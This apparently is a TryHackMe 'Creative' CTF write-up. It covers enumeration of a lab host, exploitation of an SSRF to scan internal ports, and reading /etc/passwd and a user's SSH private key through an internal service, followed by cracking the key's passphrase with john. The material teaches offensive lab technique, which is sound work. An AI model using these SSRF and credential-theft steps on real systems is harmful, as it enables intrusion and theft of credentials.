---
title: "TryHackMe: Creative"
author: cilgin
date: 2025-07-11 13:01:01 +0300
categories: [CyberSecurity]
tags: [CTF, TryHackMe, Easy]
pin: false
math: false
mermaid: false
image:
  path: /assets/img/2025-07-11-TryHackMe-Creative/main.webp
---

Hi I'm making [TryHackMe Creative](https://tryhackme.com/room/creative) room.

---

```bash
export IP=10.10.86.65
```

```bash
❯ nmap -T4 -n -sC -sV -Pn -p- $IP
Starting Nmap 7.97 ( https://nmap.org ) at 2025-07-11 13:04 +0300
Nmap scan report for 10.10.86.65
Host is up (0.072s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 28:0b:28:e5:d3:14:25:ce:d6:46:90:27:cd:27:eb:e3 (RSA)
|   256 b3:d0:78:aa:47:a3:ce:4b:e0:a3:09:d8:21:31:3c:4d (ECDSA)
|_  256 ee:6a:8d:69:3a:f3:91:bb:d3:c9:fc:71:3d:9b:3f:69 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://creative.thm
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 132.32 seconds
```

Lets visit the website.

Firstly lets add creative.thm to `/etc/hosts`

![Desktop View](/assets/img/2025-07-11-TryHackMe-Creative/photo1.webp){: width="972" height="589" }

Lets firstly fuzz the website using `gobuster`.

```bash
❯ gobuster dir -w common.txt -u http://creative.thm/ -x md,js,html,php,py,css,txt,bak -t 50
===============================================================
Gobuster v3.7
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://creative.thm/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.7
[+] Extensions:              php,py,css,txt,bak,md,js,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/assets               (Status: 301) [Size: 178] [--> http://creative.thm/assets/]
/components.html      (Status: 200) [Size: 41148]
/index.html           (Status: 200) [Size: 37589]
Progress: 42651 / 42651 (100.00%)
===============================================================
Finished
===============================================================
```

Nothing crazy.

Lets try finding subdomains.

```bash
❯ ffuf -w top_subdomains.txt -u http://creative.thm/ -H "Host:FUZZ.creative.thm" -fw 6 -t 50

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://creative.thm/
 :: Wordlist         : FUZZ: /home/cilgin/dev/wordlist/top_subdomains.txt
 :: Header           : Host: FUZZ.creative.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 50
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 6
________________________________________________

beta                    [Status: 200, Size: 591, Words: 91, Lines: 20, Duration: 78ms]
:: Progress: [114441/114441] :: Job [1/1] :: 688 req/sec :: Duration: [0:02:56] :: Errors: 0 ::
```

Lets add beta.creative.thm to the `/etc/hosts` and go tho the website.

![Desktop View](/assets/img/2025-07-11-TryHackMe-Creative/photo2.webp){: width="972" height="589" }

Lets open a python webserver to test this.

![Desktop View](/assets/img/2025-07-11-TryHackMe-Creative/photo3.webp){: width="972" height="589" }

![Desktop View](/assets/img/2025-07-11-TryHackMe-Creative/photo4.webp){: width="972" height="589" }

So it directly gets the `/` endpoint. We can use this to make ssrf. Lets try getting all localhost services. Using this `ffuf` command.

```bash
❯ ffuf -w <(seq 1 65535) -u 'http://beta.creative.thm/' -d "url=http://127.0.0.1:FUZZ/" -H 'Content-Type: application/x-www-form-urlencoded' -mc all -t 100 -fs 13

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0
________________________________________________

 :: Method           : POST
 :: URL              : http://beta.creative.thm/
 :: Wordlist         : FUZZ: /proc/self/fd/11
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : url=http://127.0.0.1:FUZZ/
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: all
 :: Filter           : Response size: 13
________________________________________________

80                      [Status: 200, Size: 37589, Words: 14867, Lines: 686, Duration: 289ms]
1337                    [Status: 200, Size: 1188, Words: 41, Lines: 40, Duration: 244ms]
```

We can see that localhost:1337 is open in that machine.

So to that manually.

![Desktop View](/assets/img/2025-07-11-TryHackMe-Creative/photo5.webp){: width="972" height="589" }
![Desktop View](/assets/img/2025-07-11-TryHackMe-Creative/photo6.webp){: width="972" height="589" }

Its giving directory listing for / but if I click any of that directories I get 404. So we need to manually write the endpoint like /etc/passwd


```text
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin sshd:x:112:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin saad:x:1000:1000:saad:/home/saad:/bin/bash lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false mysql:x:113:118:MySQL Server,,,:/nonexistent:/bin/false fwupd-refresh:x:114:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash 
```

Which gave me output. 


Now try looking for any ssh keys.


If you go to `http://127.0.0.1:1337/home/saad/.ssh/id_rsa`

You can get ssh private key for saad.


```bash
❯ nvim saad.key
❯ chmod 400 saad.key
❯ ssh saad@$IP -i saad.key
Enter passphrase for key 'saad.key': 
```

Now we need to crack the ssh key password using `john`

```bash
python2 ssh2john.py saad.key > saad_ssh.hash
```

```bash
❯ john hashes/ssh.hash --wordlist=rockyou.txt 
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 6 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
```

Which gave the password to log in.


```bash
saad@ip-10-10-86-65:~$ ls
snap  start_server.py  user.txt
saad@ip-10-10-86-65:~$ cat user.txt 
*********************************
```
